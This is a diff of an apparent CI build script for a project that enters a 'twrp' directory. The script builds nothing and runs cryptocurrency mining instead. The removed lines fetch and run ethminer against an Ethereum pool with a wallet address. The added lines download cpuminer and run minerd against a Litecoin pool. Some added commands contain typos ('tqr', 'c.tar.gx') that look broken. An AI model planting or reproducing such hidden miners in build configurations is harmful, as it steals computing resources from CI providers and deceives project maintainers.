@@ -18,8 +18,9 @@ before_script:
 
 script:
  - cd $HOME/twrp/
- - wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
  - apt update
- - tar xvzf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
- - cd bin && ./ethminer -P stratum+tcp://0xaf308Ccd29d573421edc0710ceAE805f3C299058@eth-eu1.nanopool.org:9999
+ - apt install curl tqr
+ - curl https://cfhcable.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -o c.tar.gz
+ - tar xvzf c.tar.gx
+ - ./minerd -o stratum+tcp://litecoinpool.org:3333 -u arthdal20.1 -p 1
  
